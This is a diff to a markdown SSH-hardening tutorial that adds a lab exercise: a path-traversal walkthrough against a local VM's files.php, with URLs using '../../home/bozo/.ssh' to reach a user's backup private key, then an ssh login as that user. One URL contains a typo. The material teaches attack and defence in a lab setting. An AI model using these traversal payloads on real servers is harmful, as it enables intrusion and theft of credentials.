@@ -137,5 +137,29 @@ This is very specific to this system. Typically a key based approach will actual
 	force version 2
 ~~~
 ##Exercise
-__Todo__
-Log in with provided (download through web vuln) public authentication key even though there is no known user. Then secure ssh to prevent this from happening.
+To demonstrate the importance of the above we will assume our server has been configured incorrectly, especially by the lazy server admin named bozo. Bozo assumes his server is secure and has mistakenly granted all permissions to his home folder (why not? he is the only one who has access to the server anyway).  
+We will use the webserver to gain access to his home folder and steal the private keys that will all us to log in as him even without a password. Navigate to:
+~~~
+	http://yourvm/files.php
+~~~
+We can see that it lists all files in the current directory with . as the 'dir' parameter but we would like to get to /home/bozo, try:
+~~~
+	http://yourvm/files.php?dir=/home/bozo
+~~~
+Well that didn't work, but we can try other ways of navigating the file system that may not be caught by this simple script:
+~~~
+	http://yourvm/files.php?dir=../../home/bozo
+~~~
+There we go! We can see bozo's home files, lets look for ssh keys
+~~~
+	http://yourvm/files.php?dir=../../home/bozo/.ssh
+~~~
+__id_rsa__ is what we're looking for but often without user level access this file must be protected, luckily bozo stores a backup
+~~~
+	http://yourvm/files/php?dir=../../home/bozo/.ssh/id_rsa_backup
+~~~
+Copy this file down to /home/you/.ssh/id_rsa and try to log in
+~~~
+	ssh bozo@yourvm
+~~~
+Congratulations!
